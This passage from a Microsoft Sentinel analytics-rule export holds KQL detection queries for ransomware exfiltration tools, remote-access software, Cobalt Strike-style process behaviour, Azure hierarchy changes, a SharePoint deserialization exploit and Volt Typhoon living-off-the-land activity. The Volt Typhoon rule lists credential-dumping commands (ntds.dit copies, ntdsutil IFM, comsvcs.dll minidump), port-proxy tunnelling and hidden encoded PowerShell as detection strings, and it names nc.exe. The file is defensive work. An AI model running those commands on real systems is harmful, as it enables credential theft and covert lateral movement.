InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        Tactic = \"Detects process execution of RClone or similar tools used by ransomware operators to exfiltrate data\"\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"InitiatingProcessFileName"},{"identifier":"CommandLine","columnName":"InitiatingProcessCommandLine"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"},{"identifier":"Directory","columnName":"FolderPath"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"tactics":["Exfiltration","LateralMovement"],"techniques":["T1021","T1537","T1567"],"displayName":"BAH_RClone_APT","enabled":true,"description":"This activity is significant as rclone.exe is often used by adversaries for data exfiltration, especially during ransomware attacks. If confirmed malicious, this behavior could lead to unauthorized data transfer, resulting in data breaches and potential loss of sensitive information.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-14T14:33:05.7278691Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/6d86c9c5-5722-40ef-b713-e3365ab35ea5","name":"6d86c9c5-5722-40ef-b713-e3365ab35ea5","etag":"\"30086a9c-0000-2700-0000-67360a250000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//BAH_RClone_and_Remote_Monitoring_and_Management_Tool_usage\n//Author: Shawn McWhirter\n//Description: Detects service installation of various remote access tools. Remote management tools, when used for legitimate purposes, can help IT professionals and system administrators remotely access and manage computer systems. However, threat actors may exploit these tools for malicious purposes.\n//https://www.helpnetsecurity.com/2024/09/30/ransomware-cloud-compromise/\n//https://app.snapattack.com/detection/2a43b331-55d1-4ee5-a95e-8b4ad7e4a178\n//https://app.snapattack.com/detection/4afbd373-b769-4f82-8375-41e0153e46f9\n//https://attack.mitre.org/techniques/T1021/006/\n//https://attack.mitre.org/techniques/T1567/002/\n//False Positives: IT support professionals using remote tools for admin purposes.\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName\n);\nlet ActionTypes = dynamic([\"FileCreated\", \"FileModified\", \"ImageLoaded\", \"ProcessCreated\"]);\nlet FileNames = dynamic([\n            @\"Advanced Monitoring Agent\",\n            @\"Ammyy\",\n            @\"AnyDesk\",\n            @\"Atera\",\n            @\"baconsoleapp\",\n            @\"BAConsoleAppEN\",\n            @\"BeyondTrust Remote Support\",\n            @\"chromoting\",\n            @\"FleetDeck\",\n            @\"g2mcomm.exe\",\n            @\"G2MCoreInstExtractor\",\n            @\"g2mstart\",\n            @\"GoToAssist\",\n            @\"GoTo Meeting Opener\",\n            @\"GoToMyPC\",\n            @\"GoToOpener.exe\",\n            @\"jumpcloud\",\n            @\"Kaseya Live Connect\",\n            @\"Level\",\n            @\"LMIGuardianSvc\",\n            @\"LogMeIn\",\n            @\"Mesh Agent\",\n            @\"N-Able\",\n            @\"NinjaRMM\",\n            @\"NinjaOne\",\n            @\"Parsec\",\n            @\"PC Monitor\",\n            @\"Pulseway\",\n            @\"RClone\",\n            @\"RealVNC\",\n            @\"RemotePC\",\n            @\"Remote Utilities\",\n            @\"RManService\",\n            @\"ScreenConnect\",\n            @\"Splashtop\",\n            @\"SSUService\",\n            @\"TacticalRMM\",\n            @\"takecontroltechconsole\",\n            @\"TailScale\",\n            @\"TeamViewer\",\n            @\"TightVNC\",\n            @\"UltraVNC\",\n            @\"vncserver\",\n            @\"Zoho\"\n            ]);\n(union isfuzzy = true\n(\nDeviceProcessEvents\n    | where FileName has_any (FileNames) and ActionType has_any (ActionTypes))\n    | where FileName contains \".exe\"\n    | where not(ProcessCommandLine has_any(FileNames))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        FileName,\n        ProcessCommandLine,\n        ActionType,\n        FolderPath,\n        Tactic = \"Detects service installation of various remote access tools.\")","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"File","fieldMappings":[{"identifier":"Directory","columnName":"FolderPath"},{"identifier":"Name","columnName":"FileName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"},{"identifier":"ProcessId","columnName":"ActionType"}]}],"tactics":["Exfiltration","LateralMovement"],"techniques":["T1021","T1537","T1567"],"displayName":"BAH_RClone_RMM","enabled":true,"description":"Detects service installation of various remote access tools. Remote management tools, when used for legitimate purposes, can help IT professionals and system administrators remotely access and manage computer systems. However, threat actors may exploit these tools for malicious purposes.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-14T14:33:08.6674474Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d4ba925e-4d55-4f1d-b764-2a1829bc4b72","name":"d4ba925e-4d55-4f1d-b764-2a1829bc4b72","etag":"\"3f0e9113-0000-2700-0000-674662e40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceProcessEvents\n| where InitiatingProcessCommandLine has_all(@'\"reg\"', 'add', @'\"HKLM\\SOFTWARE\\Policies\\', '/v', '/t', 'REG_DWORD', '/d', '/f')\n    and InitiatingProcessCommandLine has_any('DisableRealtimeMonitoring', 'UseTPMKey', 'UseTPMKeyPIN', 'UseAdvancedStartup', \n    'EnableBDEWithNoTPM', 'RecoveryKeyMessageSource')\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"RegistryKey","fieldMappings":[{"identifier":"Key","columnName":"InitiatingProcessCommandLine"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1112"],"displayName":"J361 - CBII Registry Key Changes","enabled":true,"description":"Detects attempts to modify the registry key to remove CBII from the machine. MITRE:T1112","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-27T00:08:00.3137819Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/daec3875-6738-48a9-a51a-df96fd28b71e","name":"daec3875-6738-48a9-a51a-df96fd28b71e","etag":"\"3f0e1d02-0000-2700-0000-674662b10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceProcessEvents\n| where FileName == \"dllhost.exe\"\n| where isnull(ProcessCommandLine) or ProcessCommandLine == \"\"\n| join kind=inner (\n    DeviceInfo\n    | where MachineGroup contains \"JSP\"\n    )\n    on DeviceId\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1055"],"displayName":"J361 - Suspicious DLLHost no Command Line Arguments","enabled":true,"description":"Suspicious DLLHost no Command Line Arguments - Rule. The following analytic detects instances of DLLHost.exe executing without command line arguments. This behavior is unusual and often associated with malicious activities, such as those performed by Cobalt Strike. This activity is significant because DLLHost.exe typically requires arguments to function correctly, and its absence may indicate an attempt to evade detection. MITRE:T1055","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-27T00:07:11.4432944Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/db8569aa-d9e9-4f5b-9705-9a1f209ef718","name":"db8569aa-d9e9-4f5b-9705-9a1f209ef718","etag":"\"8b10c426-0000-2700-0000-674f62e60000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Filter DeviceInfo for the specified MachineGroup\r\nlet filteredDevices = DeviceInfo\r\n| where MachineGroup contains \"JSP\"\r\n| project DeviceId, MachineGroup;\r\n\r\n// Query the DeviceProcessEvents table for the specified process and join with filtered devices\r\nDeviceProcessEvents\r\n| where FileName == \"searchprotocolhost.exe\"\r\n| join kind=inner (filteredDevices) on DeviceId\r\n| summarize count(), firstTime = min(Timestamp), lastTime = max(Timestamp) by bin(Timestamp, 1h), ProcessId, FileName, DeviceName, AccountName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, MachineGroup\r\n| project-rename TimeGenerated = Timestamp, DeviceName = DeviceName, User = AccountName, ProcessPath = FolderPath, Process = ProcessCommandLine, ParentProcessName = InitiatingProcessFileName\r\n| where Process matches regex @\"(?i)(searchprotocolhost\\.exe.{0,4}$)\"\r\n| project TimeGenerated, ProcessId, FileName, DeviceName, User, ProcessPath, Process, ParentProcessName, firstTime, lastTime, MachineGroup","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation","DefenseEvasion"],"techniques":["T1055"],"displayName":"J361 - Suspicious SearchProtocolHost no Command Line Arguments","enabled":true,"description":"Detects instances of searchprotocolhost.exe running without command line arguments. This behavior is unusual and often associated with malicious activities, such as those performed by Cobalt Strike. The detection leverages Endpoint Detection and Response (EDR) telemetry, focusing on process execution data. This activity is significant because searchprotocolhost.exe typically runs with specific arguments, and its absence may indicate an attempt to evade detection. If confirmed malicious, this could lead to unauthorized code execution, potential credential dumping, or other malicious actions within the environment. MITRE:T1055","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-03T19:58:28.3439222Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/04142cac-4011-4539-a9a3-7865d68cd37a","name":"04142cac-4011-4539-a9a3-7865d68cd37a","etag":"\"801be738-0000-2700-0000-6772a9c10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Desription:Detects changes to resource groups, subscriptions, or management groups in Azure that may indicate malicious activity.\r\n//status:tested\r\n//author:Danielle Torrence\r\nAzureActivity\r\n| where OperationNameValue has_any (\r\n    \"resourcegroups/write\", \r\n    \"resourcegroups/delete\",\r\n    \"subscriptions/write\", \r\n    \"subscriptions/delete\",\r\n    \"managementGroups/write\", \r\n    \"managementGroups/delete\",\r\n    \"LeaveOrganization\"\r\n)\r\n| extend Activity = case(\r\n    OperationNameValue has \"resourcegroups/write\", \"Resource Group Created\",\r\n    OperationNameValue has \"resourcegroups/delete\", \"Resource Group Deleted\",\r\n    OperationNameValue has \"subscriptions/write\", \"Subscription Created or Modified\",\r\n    OperationNameValue has \"subscriptions/delete\", \"Subscription Deleted\",\r\n    OperationNameValue has \"managementGroups/write\", \"Management Group Created or Modified\",\r\n    OperationNameValue has \"managementGroups/delete\", \"Management Group Deleted\",\r\n    OperationNameValue has \"LeaveOrganization\", \"Subscription Left Organization\",\r\n    \"Unknown\"\r\n)\r\n| project TimeGenerated, Caller, CallerIpAddress, OperationNameValue, Activity, ResourceGroup, ResourceId\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"COLSNA_CTE_Monitor Changes to Cloud Resource Hierarchy","enabled":true,"description":"Detects changes to resource groups, subscriptions, or management groups in Azure that may indicate malicious activity.\nPlatform:IAAS\nMITRE:TA0005;T1666","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-30T14:10:07.3426549Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ee165a1f-838f-4790-87d2-d501398d9096","name":"ee165a1f-838f-4790-87d2-d501398d9096","etag":"\"801b3c41-0000-2700-0000-6772a9d40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Volt Typhoon LOTL Activity\r\n//Author Danielle Torrence\r\n//Description: This analytic is designed to identify and respond to sophisticated cyber threats, particularly those that employ \"living off the land\" (LOTL) techniques by utilizing built-in system tools such as ntdsutil, wevtutil, cmd.exe, and powershell.exe for nefarious activities like credential theft, lateral movement, or data exfiltration. \r\n// False Postives: None Known\r\nlet knownFileHashes = dynamic([\r\n     \"f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd\",\r\n    \"ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31\",\r\n    \"d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca\",\r\n    \"472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d\",\r\n    \"66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7\",\r\n    \"3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71\",\r\n    \"41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597\",\r\n    \"c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99\",\r\n    \"3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f\",\r\n    \"fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15\",\r\n    \"ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484\",\r\n    \"baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c\",\r\n    \"b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74\",\r\n    \"4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349\",\r\n    \"c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d\",\r\n    \"d6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af\",\r\n    \"9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a\",\r\n    \"450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267\",\r\n    \"93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066\",\r\n    \"7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5\",\r\n    \"389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61\",\r\n    \"c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b\",\r\n    \"e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95\",\r\n    \"6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff\",\r\n    \"cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984\",\r\n    \"17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4\",\r\n    \"8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2\",\r\n    \"d17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295\",\r\n    \"472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d\",\r\n    \"3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642\",\r\n    \"edc0c63065e88ec96197c8d7a40662a15a812a9583dc6c82b18ecd7e43b13b70\"\r\n]);\r\nlet knownFileNames = dynamic([\r\n    \"backup.bat\", \"BrightmetricAgent.exe\", \"cl64.exe\", \"update.bat\", \"Win.exe\",\r\n    \"billagent.exe\", \"nc.exe\", \"update.exe\", \"WmiPrvSE.exe\",\r\n    \"billaudit.exe\", \"rar.exe\", \"vm3dservice.exe\", \"WmiPreSV.exe\",\r\n    \"cisco_up.exe\", \"SMSvcService.exe\", \"watchdogd.exe\"\r\n]);\r\nlet knownMaliciousCommands =  dynamic([\r\n    'cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"',\r\n    'cmd /c vssadmin create shadow /for=C:',\r\n    'cmd /c copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy3\\\\Windows\\\\NTDS\\\\ntds.dit C:\\\\Windows\\\\Temp',\r\n    'wmic process call create \"ntdsutil \\\\\"ac i ntds\\\\\" ifm \\\\\"create full C:\\\\Windows\\\\Temp\\\\pro\\\\\"\"',\r\n    'wmic process call create \"cmd.exe /c ntdsutil \\\\\"ac i ntds\\\\\" ifm \\\\\"create full C:\\\\Windows\\\\Temp\\\\Pro\\\\\"\"',\r\n    'wmic process call create \"cmd.exe /c mkdir C:\\\\Windows\\\\Temp\\\\tmp & ntdsutil \\\\\"ac i ntds\\\\\" ifm \\\\\"create full C:\\\\Windows\\\\Temp\\\\tmp\\\\\"\"',\r\n    'cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\"',\r\n    'cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=<*.*.*.*>',\r\n    'cmd.exe /Q /c dir 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__* 2>&1',\r\n    'reg query hklm\\\\software\\\\OpenSSH',\r\n    'reg query hklm\\\\software\\\\realvnc',\r\n    'reg query hkcu\\\\software\\\\*\\\\putty\\\\sessions',\r\n    'cmd.exe /c powershell -exec bypass -W hidden -nop -E *',\r\n    'cmd.exe /c ntdsutil \"ac i ntds\" ifm \"create full C:\\\\Windows\\\\Temp\\\\pro\" q q',\r\n    'rundll32.exe \"C:\\\\Windows\\\\System32\\\\comsvcs.dll\", MiniDump 552 C:\\\\Windows\\\\Temp\\\\vmware-vhost.dmp full\"',\r\n    'cmd.exe /c ntdsutil \"ac i ntds\" ifm \"create full C:\\\\Windows\\\\Temp\\\\pro\" q q'\r\n]);\r\nlet suspiciousPaths = dynamic([\r\n    \"C:\\\\Users\\\\Public\\\\Appfile\",\r\n    \"C:\\\\Perflogs\",\r\n    \"C:\\\\Windows\\\\Temp\",\r\n    \"C:\\\\Windows\\\\Temp\\\\McAfee_Logs\"\r\n]);\r\nlet securityEvents = SecurityEvent\r\n| where EventID in (4688, 4663, 4624, 4656, 4657, 4673)\r\n| extend CommandLine = tostring(parse_json(EventData).CommandLine)\r\n| extend ProcessName = tostring(split(CommandLine, ' ')[0])\r\n| extend FileName = tostring(split(CommandLine, ' ')[-1])\r\n| where CommandLine has_any (knownMaliciousCommands)\r\n| project TimeGenerated, Computer, Account, CommandLine, ProcessName, FileName;\r\nlet deviceFileEvents = DeviceFileEvents\r\n| where FileName endswith \".exe\" or FileName endswith \".bat\"\r\n| where FolderPath has_any (suspiciousPaths)\r\n| where SHA256 has_any (knownFileHashes)\r\n| project FileAccessTime = TimeGenerated, FileAccessedFileName = FileName, FileAccessedFolderPath = FolderPath, DeviceName, InitiatingProcessAccountName, SHA256;\r\nSecurityEvent\r\n| join kind=inner (DeviceFileEvents) on $left.Computer == $right.DeviceName and $left.Account == $right.InitiatingProcessAccountName\r\n| summarize Commands = make_set(CommandLine), AccessedFiles = make_set(FileName), AccessedPaths = make_set(FolderPath), Hashes = make_set(SHA256) by Account, Computer, bin(TimeGenerated, 1h)\r\n| order by TimeGenerated desc;\r\n\r\n\r\n\r\n\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CredentialAccess","Discovery","DefenseEvasion","Collection","PrivilegeEscalation","Persistence","CommandAndControl","LateralMovement"],"techniques":["T1059","T1003","T1082","T1047","T1033","T1016","T1012","T1040","T1070","T1078","T1074","T1090","T1105","T1570"],"displayName":"COLSNA_CTE_Volt Typhoon LOTL Activity","enabled":true,"description":"This analytic is designed to identify and respond to sophisticated cyber threats, particularly those that employ \"living off the land\" (LOTL) techniques by utilizing built-in system tools such as ntdsutil, wevtutil, cmd.exe, and powershell.exe for nefarious activities like credential theft, lateral movement, or data exfiltration. \nIt focuses on unusual command-line patterns and file access behaviors that are often overlooked by standard security measures, aiming to provide deep insights into covert operations possibly conducted by advanced persistent threat (APT) actors, exemplified by the hypothetical \"Volt Typhoon\".        \n\nPLATFORM: Azure AD, Microsoft 365, IaaS, Windows\nMITRE:TA0002;T1047;T1059,TA0006;T1003;T1040,TA0007;T1012;T1016;T1033;T1040;T1082,TA0005;T1070;T1070.004;T1078;T1078.002,TA0009;T1074;T1074.001,TA0004;T1078;T1078.002,TA0003;T1078;T1078.002,TA0011;T1090;T1090.002;T1105,TA0008;T1570\n\nReferences:\nhttps://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/\nhttps://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\nhttps://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations\nhttps://attack.mitre.org/groups/G1017/\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\nhttps://www.securityweek.com/chinese-apt-volt-typhoon-linked-to-unkillable-soho-router-botnet/","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-30T14:10:28.1914916Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/fa74e7a6-d7d2-419b-a8c1-30dc19801ba6","name":"fa74e7a6-d7d2-419b-a8c1-30dc19801ba6","etag":"\"04153ce4-0000-2700-0000-675af4320000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//BAH_SharePoint_Remote_Code_Execution\n//Author: Shawn McWhirter\n//Description: The rule monitors for suspicious activities involving .bdcm files on SharePoint. These files contain metadata for connecting to external data sources. Overwriting these files could be linked to deserialization exploits, thus any actions modifying a .bdcm file should warrant immediate investigation.\n//https://app.snapattack.com/detection/7efa6497-477e-48ae-addd-569488ed65e9\n//https://app.snapattack.com/detection/4330446a-f4cb-40a8-a4fa-3147cf453513\n//https://github.com/testanull/MS-SharePoint-July-Patch-RCE-PoC\n//https://www.rapid7.com/blog/post/2024/07/09/patch-tuesday-july-2024/\n//https://thehackernews.com/2024/10/cisa-warns-of-active-exploitation-of.html\n//False Positives: None known.\nlet signInLookup = (\n    SigninLogs\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName\n    );\nlet urlparts = dynamic([@\"_api/web\", @\"overwrite=true\"\n    ]);\n(union isfuzzy=true\n    (\n    DeviceEvents\n    | where FileOriginUrl has_all(urlparts) or RemoteUrl has_all(urlparts)\n    | project\n        TimeGenerated,\n        ActionType,\n        FileOriginUrl,\n        RemoteUrl,\n        AccountName,\n        AccountDomain,\n        DeviceName,\n        DeviceId,\n        Tactic = \"Possible deserialization exploit on SharePoint (CVE 2024-38094)\"\n    ),\n    (\n    DeviceNetworkEvents\n    | where RemoteUrl has_all(urlparts)\n    | project\n        TimeGenerated,\n        ActionType,\n        RemoteUrl,\n        DeviceName,\n        DeviceId,\n        Tactic = \"Possible deserialization exploit on SharePoint (CVE 2024-38094)\"\n    ),\n    (\n    DeviceFileEvents\n    | where FileOriginUrl has_all(urlparts) or FileOriginReferrerUrl has_all(urlparts)\n    | project\n        TimeGenerated,\n        ActionType,\n        FileOriginUrl,\n        FileOriginReferrerUrl,\n        DeviceName,\n        DeviceId,\n        Tactic = \"Possible deserialization exploit on SharePoint (CVE 2024-38094)\"\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"},{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileOriginUrl"},{"identifier":"Directory","columnName":"RemoteUrl"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ActionType"}]}],"tactics":["Collection","InitialAccess","CommandAndControl"],"techniques":["T1213","T1190","T1102"],"displayName":"BAH_SharePoint_RCE","enabled":true,"description":"A critical deserialization vulnerability in Microsoft SharePoint, identified as CVE-2024-38094, is currently being exploited in the wild. This flaw allows authenticated attackers with Site Owner permissions to inject and execute arbitrary code within the SharePoint Server context, posing a significant threat to federal enterprises.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-12T14:33:20.5249692Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4147efc5-fe4d-41c4-9b48-cd9e7bde509e","name":"4147efc5-fe4d-41c4-9b48-cd9e7bde509e","etag":"\"10182f32-0000-2700-0000-676380230000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceFileEvents\r\n| where Timestamp between (ago(1d) .. now())\r\n| where FileName endswith \".cab\"\r\n| where DeviceId in (DeviceInfo | where MachineGroup contains \"JSP\" | project DeviceId)\r\n| summarize count(), file_path = make_list(FolderPath), firstTime = min(Timestamp), lastTime = max(Timestamp) by DeviceName, ActionType, InitiatingProcessId, FileName, MachineGroup\r\n| project DeviceName, ActionType, InitiatingProcessId, FileName, file_path, firstTime, lastTime, MachineGroup\r\n| extend firstTime = format_datetime(firstTime, 'yyyy-MM-dd HH:mm:ss'), lastTime = format_datetime(lastTime, 'yyyy-MM-dd 